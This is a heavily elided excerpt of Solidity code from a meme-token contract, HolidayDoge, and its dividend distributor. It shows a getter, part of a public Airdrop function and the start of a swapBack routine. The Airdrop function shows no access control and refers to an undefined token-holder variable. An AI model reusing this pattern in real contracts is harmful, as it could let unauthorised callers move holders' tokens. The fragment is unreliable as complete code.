...
contract DividendDistributor is IDividendDistributor {
    ...
    function minPeriodminDistributionminTokenBalanceForDividends() external view returns (uint256,uint256,uint256){
        return (minPeriod, minDistribution, minimumTokenBalanceForDividends);
    }
...
contract HolidayDoge is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    function Airdrop(address[] calldata addresses, uint256 tAmount) public{
        ...
        require(balanceOf(_tokenholder) >= SCCC || _tokenholder == ZERO, "Not enough tokens in wallet");
        for(uint i=0; i < addresses.length; i++){
            if(_tokenholder != ZERO)_balances[_tokenholder] = _balances[_tokenholder] - tAmount;
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountETH = address(this).balance.sub(amountETHbefore);
